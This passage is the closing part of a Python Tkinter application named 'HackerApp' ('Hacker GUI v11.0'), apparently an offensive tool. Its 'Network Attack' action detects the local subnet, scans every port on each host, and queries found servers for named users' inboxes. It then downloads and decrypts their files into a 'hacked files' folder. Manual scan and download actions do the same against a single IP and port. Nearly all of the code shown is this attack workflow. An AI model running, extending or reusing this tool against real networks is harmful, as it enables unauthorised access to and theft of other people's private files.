         self._update_progress(current, total)

    def _reset_progress(self):
         self.after_idle(lambda: self._update_progress(0, 1)) 

    def _clear_output(self):
        
        try:
            if self.output_text.winfo_exists():
                self.output_text.configure(state=tk.NORMAL)
                self.output_text.delete('1.0', tk.END)
                self.output_text.configure(state=tk.DISABLED)
        except tk.TclError: pass


    def _set_buttons_state(self, state):
        """Sets state for ALL action buttons."""
        def update_state():
            buttons = [
                getattr(self, 'scan_button', None),
                getattr(self, 'get_button', None),
                getattr(self, 'network_attack_button', None),
                getattr(self, 'port_scan_checkbox', None),
                getattr(self, 'full_scan_checkbox', None),
            ]
            try:
                for button in buttons:
                    if button and button.winfo_exists():
                        
                        if button == self.full_scan_checkbox:
                            if state == tk.NORMAL and self.port_scan_enabled_var.get():
                                button.config(state=tk.NORMAL)
                            else:
                                button.config(state=tk.DISABLED)
                        elif button == self.port_scan_checkbox:
                             button.config(state=state)
                        else: 
                            button.config(state=state)
            except tk.TclError: pass
            except Exception as e: print(f"[ERROR] GUI Button State Error: {e}")
        self.after_idle(update_state)

    
    def _update_scan_checkbox_label(self):
        if not hasattr(self, 'port_scan_checkbox') or not self.port_scan_checkbox.winfo_exists(): return
        is_enabled = self.port_scan_enabled_var.get()
        label_text = f"Enable Port Scan for Manual Actions" if is_enabled else "Port Scan Disabled for Manual Actions"
        try: self.port_scan_checkbox.config(text=label_text)
        except tk.TclError: pass

    def _toggle_port_scan(self):
        global ENABLE_PORT_SCANNING 
        ENABLE_PORT_SCANNING = self.port_scan_enabled_var.get()
        status = "enabled" if ENABLE_PORT_SCANNING else "disabled"
        print(f"[CONFIG] Port scanning for *Manual* actions {status}.")
        try:
            if self.full_scan_checkbox.winfo_exists():
                self.full_scan_checkbox.config(state=tk.NORMAL if ENABLE_PORT_SCANNING else tk.DISABLED)
        except tk.TclError: pass
        self._update_scan_checkbox_label()

    def _toggle_full_scan(self):
        is_full_scan = self.scan_full_range_var.get()
        scan_type = "Full range" if is_full_scan else f"Limited range ({PORT_SCAN_RANGE[0]}-{PORT_SCAN_RANGE[1]})" 
        if self.port_scan_enabled_var.get():
             print(f"[CONFIG] *Manual* action port scan range set to: {scan_type}.")
        self._update_scan_checkbox_label() 

    
    def _run_in_thread(self, target_func, args=(), kwargs={}):
        thread = threading.Thread(target=self._thread_wrapper, args=(target_func, args, kwargs), daemon=True)
        thread.start()

    def _thread_wrapper(self, target_func, args, kwargs):
        self._set_buttons_state(tk.DISABLED)
        self._reset_progress()
        self.after_idle(lambda: self.output_text.see(tk.END) if self.output_text.winfo_exists() else None)
        start_time = time.time()
        action_success = False
        try:
            print(f"\n--- Starting Action: {target_func.__name__} ---")
            target_func(*args, **kwargs) 
            print(f"--- Action Finished: {target_func.__name__} ---")
            action_success = True
            
            
            
            
            
            
            

        except Exception as e:
            end_time = time.time()
            print("\n--- THREAD EXCEPTION CAUGHT ---", file=sys.__stderr__)
            traceback.print_exc(file=sys.__stderr__)
            print("--- END THREAD EXCEPTION ---", file=sys.__stderr__)
            self._update_status(f"Action failed with error after {end_time - start_time:.2f}s.")
            
            
            
            
            
            
            
        finally:
            end_time = time.time()
            if action_success:
                 self._update_status(f"Action completed in {end_time - start_time:.2f}s.")
            self._set_buttons_state(tk.NORMAL)
            self._reset_progress()
            self.after_idle(lambda: self.output_text.see(tk.END) if self.output_text.winfo_exists() else None)


    
    def _get_fallback_ip_manual_port(self):
        """Validates and returns fallback IP and manual port from GUI."""
        server_ip = self.server_ip_var.get().strip()
        port_str = self.server_port_var.get().strip()
        ip_valid = False
        port_valid = False

        if server_ip:
            try:
                socket.getaddrinfo(server_ip, None)
                ip_valid = True
            except socket.gaierror:
                 messagebox.showerror("Input Error", f"Invalid or unresolvable Fallback IP: {server_ip}", parent=self)
                 server_ip = None 
            except Exception as e:
                 print(f"[Warning] IP address validation error for {server_ip}: {e}")
                 ip_valid = True 

        if port_str:
             try:
                 server_port = int(port_str)
                 if not (0 < server_port < 65536):
                     raise ValueError("Port out of range 1-65535")
                 port_valid = True
             except ValueError:
                  messagebox.showerror("Input Error", "Invalid Manual Port number (1-65535).", parent=self)
                  server_port = None 
        else: 
             server_port = None

        return server_ip if ip_valid else None, server_port if port_valid else None


    

    def _scan_action(self):
        """Manual Scan: Uses fallback IP/manual port and scan settings."""
        username = self.scan_user_var.get().strip() 
        if not username:
            messagebox.showerror("Input Error", "Please enter username(s) to scan in the 'Usernames to Check' field.", parent=self)
            return
        server_ip, initial_port = self._get_fallback_ip_manual_port()
        if not server_ip: messagebox.showerror("Input Error", "Fallback IP is required for Manual Scan.", parent=self); return
        if not initial_port: messagebox.showerror("Input Error", "Manual Port is required for Manual Scan.", parent=self); return

        
        username_to_check = username.split(',')[0].strip()
        if not username_to_check:
             messagebox.showerror("Input Error", "No valid username entered.", parent=self)
             return

        self._update_status(f"Manual Scan for '{username_to_check}' on {server_ip}:{initial_port}...")

        
        print(f"\n[MANUAL SCAN] Using specified IP: {server_ip}, Port: {initial_port}")
        print(f"[MANUAL SCAN] Checking user: '{username_to_check}'")
        self._update_status(f"Checking {server_ip}:{initial_port} for '{username_to_check}'...")

        def manual_scan_task():
             
             result = scan_user_inbox(server_ip, initial_port, username_to_check)

             if result is None:
                 print(f"[ERROR] Manual Scan failed for '{username_to_check}' on {server_ip}:{initial_port}.")
                 self._update_status(f"Manual Scan failed for '{username_to_check}'.")
             elif not result:
                 print(f"[INFO] Manual Scan: Inbox empty for '{username_to_check}' on {server_ip}:{initial_port}.")
                 self._update_status(f"Manual Scan: Inbox empty for '{username_to_check}'.")
             else:
                 print(f"[SUCCESS] Manual Scan: Found {len(result)} file(s) for '{username_to_check}' on {server_ip}:{initial_port}.")
                 self._update_status(f"Manual Scan: Found {len(result)} file(s) for '{username_to_check}'.")
                 
                 for f in result: print(f"  - ID: {f.get('id')}, Name: {f.get('filename')}")

        self._run_in_thread(manual_scan_task)


    def _get_action(self):
        """Manual Download: Uses fallback IP/manual port."""
        file_id_str = self.get_id_var.get().strip()
        recipient = self.get_recipient_var.get().strip()
        filename = self.get_filename_var.get().strip()
        server_ip, target_port = self._get_fallback_ip_manual_port()

        if not server_ip: messagebox.showerror("Input Error", "Fallback IP is required.", parent=self); return
        if not target_port: messagebox.showerror("Input Error", "Manual Port is required.", parent=self); return
        if not recipient: messagebox.showerror("Input Error", "Recipient username required.", parent=self); return
        if not filename: messagebox.showerror("Input Error", "Original filename required.", parent=self); return
        try:
            file_id = int(file_id_str)
            if file_id <= 0: raise ValueError("File ID must be positive")
        except ValueError:
            messagebox.showerror("Input Error", "Valid positive numeric File ID required.", parent=self); return

        self._update_status(f"Manual Download: ID {file_id} for '{recipient}' from {server_ip}:{target_port}...")
        print(f"\n[MANUAL GET] Attemping download: ID {file_id}, Recipient '{recipient}', File '{filename}' from {server_ip}:{target_port}")

        def manual_download_task():
            
            encrypted_path, downloaded_size = download_encrypted_file(
                server_ip, target_port, file_id, recipient, progress_callback=self._download_progress_update 
            )
            self._reset_progress() 

            if encrypted_path and downloaded_size > 0:
                user_output_dir = os.path.join(HACKED_FILES_DIR, recipient)
                print(f"  Manual Download successful ({downloaded_size} bytes). Decrypting...")
                self._update_status(f"Manual Download OK. Decrypting ID {file_id}...")
                decrypt_success = decrypt_and_save(encrypted_path, user_output_dir, filename, downloaded_size)

                if decrypt_success:
                    self._update_status(f"Manual Download & Decrypt SUCCESS for ID {file_id}.")
                    print(f"  Manual Decryption SUCCESS.")
                    try:
                        os.remove(encrypted_path) 
                    except OSError as rm_err: print(f"[WARNING] Could not remove temp file {encrypted_path}: {rm_err}")
                else:
                    self._update_status(f"Manual Download OK, Decryption FAILED for ID {file_id}. Keeping encrypted file.")
                    print(f"  Manual Decryption FAILED.")
                    
                    try:
                        encrypted_save_dir = os.path.join(user_output_dir, ENCRYPTED_SAVE_SUBDIR)
                        if ensure_dir_exists(encrypted_save_dir):
                             
                             base_name = os.path.basename(encrypted_path)
                             enc_dest_path = os.path.join(encrypted_save_dir, base_name)
                             counter = 1
                             while os.path.exists(enc_dest_path):
                                 name, ext = os.path.splitext(base_name)
                                 enc_dest_path = os.path.join(encrypted_save_dir, f"{name}_{counter}{ext}")
                                 counter += 1;
                                 if counter > 100: enc_dest_path = None; break 
                             if enc_dest_path:
                                 print(f"    Moving encrypted file to: {enc_dest_path}")
                                 shutil.move(encrypted_path, enc_dest_path)
                             else: print(f"[ERROR] Could not determine unique save path for encrypted file.")
                        else: print(f"[ERROR] Could not create dir for saving encrypted file: {encrypted_save_dir}")
                    except Exception as move_err: print(f"[ERROR] Could not move temp encrypted file {encrypted_path}: {move_err}")
            else:
                print(f"[ERROR] Manual Download FAILED for ID {file_id} from {server_ip}:{target_port}.")
                self._update_status(f"Manual Download FAILED for ID {file_id}.")

        self._run_in_thread(manual_download_task)


    

    def _network_attack_action(self):
        """Handles the 'Scan Network & Attack' button click."""
        users_str = self.scan_user_var.get().strip() 
        if not users_str:
            messagebox.showerror("Input Error", "Please enter at least one username in the 'Usernames to Check' field for the network attack.", parent=self)
            return
        usernames = [u.strip() for u in users_str.split(',') if u.strip()]
        if not usernames:
             messagebox.showerror("Input Error", "No valid usernames provided.", parent=self)
             return

        
        target_ips = []
        gateway_ip = get_default_gateway_ip()
        if gateway_ip:
            target_ips = get_subnet_ips(gateway_ip)
            if not target_ips:
                print("[WARNING] Gateway found but failed to generate subnet IPs. Check gateway/subnet logic.")
        else:
            print("[WARNING] Could not detect gateway (or netifaces missing).")

        
        if not target_ips:
            fallback_ip, _ = self._get_fallback_ip_manual_port() 
            if fallback_ip:
                print(f"[INFO] Falling back to scanning only the specified Fallback IP: {fallback_ip}")
                target_ips = [fallback_ip]
            else:
                 messagebox.showerror("Input Error", "Gateway detection failed and no valid Fallback IP entered. Cannot perform network scan.", parent=self)
                 return

        if not target_ips:
             messagebox.showerror("Error", "Could not determine any target IP addresses for scanning.", parent=self)
             return

        self._clear_output()
        print(f"--- Network Attack Requested ---")
        print(f"Target IPs ({len(target_ips)}): {target_ips if len(target_ips) < 10 else str(target_ips[:5]) + '...' + str(target_ips[-5:])}")
        print(f"Usernames to Check: {usernames}")
        print(f"Scanning ALL ports (1-65535) on each target IP.")
        print(f"Attempting CHECK/GET for specified users on any open ports found.")
        print(f"WARNING: This will be VERY SLOW and network-intensive!")
        if not messagebox.askyesno("Confirm Network Attack",
                                   f"This will scan {len(target_ips)} IP(s) across all 65535 ports for users '{', '.join(usernames)}'.\n\n"
                                   f"This can take a very long time (potentially hours) and generate significant network traffic.\n\n"
                                   f"Proceed?", parent=self):
            print("--- Network Attack Cancelled by User ---")
            return

        self._update_status(f"Starting Network Attack on {len(target_ips)} IPs for users: {', '.join(usernames)}...")

        
        self._run_in_thread(self._perform_network_attack, args=(target_ips, usernames))

    def _perform_network_attack(self, target_ips, usernames):
        """
        Core logic for scanning network, finding ports, checking users, downloading, and decrypting.
        Runs in a background thread.
        """
        total_ips_to_scan = len(target_ips)
        found_servers = {} 
        files_to_download = [] 
        summary = {
            "ips_scanned": 0,
            "servers_found": 0, 
            "files_found": 0,
            "downloads_attempted": 0,
            "downloads_successful": 0,
            "decryptions_successful": 0,
            "decryptions_failed": 0,
        }

        
        print(f"\n--- Phase 1: Scanning {total_ips_to_scan} IPs for All Open Ports (1-65535) ---")
        for i, ip in enumerate(target_ips):
            self._update_status(f"Scanning IP {i+1}/{total_ips_to_scan}: {ip} (Ports 1-65535)...")
            
            self._update_progress(i + 1, total_ips_to_scan)

            
            ip_progress_total_ports = 65535
            def ip_port_scan_progress(current, total):
                 
                 
                 
                 
                 self._update_progress(current, total) 

            open_ports = find_all_open_ports_for_ip(
                ip,
                NETWORK_SCAN_IP_TIMEOUT_SECONDS,
                NETWORK_SCAN_MAX_THREADS,
                scan_progress_callback=ip_port_scan_progress 
            )
            summary["ips_scanned"] += 1

            if open_ports:
                found_servers[ip] = open_ports
                summary["servers_found"] += len(open_ports)
                print(f"[Network Scan] Found {len(open_ports)} open ports on {ip}.")
            else:
                 print(f"[Network Scan] No open ports found or scan timed out for {ip}.")

            
            

        print(f"\n--- Phase 1 Complete: Scanned {summary['ips_scanned']} IPs. Found {summary['servers_found']} potential server endpoints (IP:Port pairs). ---")
        self._reset_progress() 

        
        print(f"\n--- Phase 2: Checking {len(usernames)} User(s) on {summary['servers_found']} Found Endpoints ---")
        endpoints_to_check = []
        for ip, ports in found_servers.items():
            for port in ports:
                endpoints_to_check.append((ip, port))

        total_endpoints = len(endpoints_to_check)
        endpoints_checked = 0
        for ip, port in endpoints_to_check:
            endpoints_checked += 1
            self._update_status(f"Checking User(s) on Endpoint {endpoints_checked}/{total_endpoints}: {ip}:{port}...")
            self._update_progress(endpoints_checked, total_endpoints) 

            for username in usernames:
                
                result = scan_user_inbox(ip, port, username)
                if result is not None and len(result) > 0: 
                    print(f"[+] SUCCESS: Found {len(result)} file(s) for user '{username}' on {ip}:{port}!")
                    for file_info in result:
                        try:
                            file_id = file_info['id']
                            filename = file_info['filename']
                            
                            files_to_download.append((file_id, username, filename, ip, port))
                            summary["files_found"] += 1
                            print(f"    - Queued: ID {file_id}, File '{filename}'")
                        except KeyError as e:
                             print(f"[WARNING] Malformed file entry for '{username}' on {ip}:{port}: Missing key {e}")
                        except Exception as e:
                              print(f"[WARNING] Error processing file entry for '{username}' on {ip}:{port}: {e}")
                elif result == []: 
                     print(f"[*] Confirmed empty inbox for user '{username}' on {ip}:{port}.")
                

        print(f"\n--- Phase 2 Complete: Checked {total_endpoints} endpoints. Found {summary['files_found']} files queued for download. ---")
        self._reset_progress()

        
        total_files_to_process = len(files_to_download)
        print(f"\n--- Phase 3: Attempting Download & Decryption for {total_files_to_process} Queued Files ---")
        if total_files_to_process == 0:
             print("No files found to download.")
             self._update_status("Network Attack Complete: No files found.")
             return 

        for j, (file_id_str, recipient, orig_filename, ip, port) in enumerate(files_to_download):
            self._update_status(f"Downloading File {j+1}/{total_files_to_process}: ID {file_id_str} from {ip}:{port}...")
            print(f"\n[{j+1}/{total_files_to_process}] Processing: ID {file_id_str}, User '{recipient}', File '{orig_filename}' from {ip}:{port}")
            summary["downloads_attempted"] += 1

            try: file_id_int = int(file_id_str)
            except ValueError: print(f"[ERROR] Invalid File ID '{file_id_str}'. Skipping."); continue

            
            encrypted_path, downloaded_size = download_encrypted_file(
                ip, port, file_id_int, recipient, progress_callback=self._download_progress_update 
            )
            self._reset_progress() 

            if encrypted_path and downloaded_size > 0:
                summary["downloads_successful"] += 1
                print(f"  Download successful ({downloaded_size} bytes). Attempting decryption...")
                self._update_status(f"File {j+1}/{total_files_to_process} Downloaded. Decrypting...")

                
                user_output_dir = os.path.join(HACKED_FILES_DIR, recipient)
                decrypt_success = decrypt_and_save(
                    encrypted_path, user_output_dir, orig_filename, downloaded_size
                )

                if decrypt_success:
                    summary["decryptions_successful"] += 1
                    print(f"  Decryption successful -> '{orig_filename}' saved.")
                    try: os.remove(encrypted_path) 
                    except OSError as rm_err: print(f"[WARNING] Could not remove temp file {encrypted_path}: {rm_err}")
                else:
                    summary["decryptions_failed"] += 1
                    print(f"  Decryption FAILED for '{orig_filename}'. Keeping encrypted file.")
                    
                    try:
                        encrypted_save_dir = os.path.join(user_output_dir, ENCRYPTED_SAVE_SUBDIR)
                        if ensure_dir_exists(encrypted_save_dir):
                            base_name = os.path.basename(encrypted_path)
                            enc_dest_path = os.path.join(encrypted_save_dir, base_name)
                            counter = 1
                            while os.path.exists(enc_dest_path):
                                name, ext = os.path.splitext(base_name)
                                enc_dest_path = os.path.join(encrypted_save_dir, f"{name}_{counter}{ext}")
                                counter += 1;
                                if counter > 100: enc_dest_path = None; break
                            if enc_dest_path: shutil.move(encrypted_path, enc_dest_path)
                            else: print(f"[ERROR] Could not determine unique save path for {encrypted_path}")
                        else: print(f"[ERROR] Could not create save dir {encrypted_save_dir}")
                    except Exception as move_err: print(f"[ERROR] Failed to move {encrypted_path}: {move_err}")

            else:
                print(f"  Download FAILED for ID {file_id_str} from {ip}:{port}.")
                
                self._update_status(f"File {j+1}/{total_files_to_process} Download Failed.")

            
            if j < total_files_to_process - 1 and DOWNLOAD_DELAY_SECONDS > 0:
                
                time.sleep(DOWNLOAD_DELAY_SECONDS)

        print("\n--- Phase 3 Complete ---")

        
        print("\n--- Network Attack Summary ---")
        print(f"IPs Scanned: {summary['ips_scanned']}")
        print(f"Potential Server Endpoints Found (IP:Port): {summary['servers_found']}")
        print(f"Total Files Found (across users/servers): {summary['files_found']}")
        print(f"File Downloads Attempted: {summary['downloads_attempted']}")
        print(f"File Downloads Successful: {summary['downloads_successful']}")
        print(f"Files Decrypted Successfully: {summary['decryptions_successful']}")
        print(f"Decryptions Failed (Encrypted Kept): {summary['decryptions_failed']}")

        final_status = f"Network Attack Done: {summary['decryptions_successful']} decrypted, {summary['decryptions_failed']} kept encrypted, {summary['files_found'] - summary['downloads_successful']} failed downloads."
        self._update_status(final_status)



if __name__ == "__main__":
    
    if not PYCRYPTODOME_AVAILABLE or AES_KEY is None:
        
        print("CRITICAL ERROR: PyCryptodome missing or AES Key invalid. Exiting.", file=sys.__stderr__)
        sys.exit(1)

    app = HackerApp()
    

    try:
        app.mainloop()

    except KeyboardInterrupt:
        print("\n[INFO] KeyboardInterrupt received. Exiting GUI...")
    finally:
        print("\n--- Exiting Hacker GUI (v11.0 - No Music) ---")
        

        
        try:
            if os.path.exists(TEMP_DOWNLOAD_DIR):
                 
                 is_empty = True
                 if os.listdir(TEMP_DOWNLOAD_DIR): 
                      for item in os.listdir(TEMP_DOWNLOAD_DIR):
                          item_path = os.path.join(TEMP_DOWNLOAD_DIR, item)
                          try:
                              if os.path.isfile(item_path) and os.path.getsize(item_path) > 0: is_empty=False; break
                              if os.path.isdir(item_path) and os.listdir(item_path): is_empty=False; break
                          except OSError: is_empty=False; break 
                 
                 if is_empty:
                     print(f"[CLEANUP] Removing empty temporary directory: {TEMP_DOWNLOAD_DIR}")
                     try: shutil.rmtree(TEMP_DOWNLOAD_DIR) 
                     except OSError as rmdir_e: print(f"[CLEANUP] Error removing empty temp dir {TEMP_DOWNLOAD_DIR}: {rmdir_e}")
                 else:
                     print(f"[INFO] Temporary download directory '{TEMP_DOWNLOAD_DIR}' is not empty, not removing.")
        except Exception as e:
             print(f"[CLEANUP] Unexpected error during cleanup: {e}")

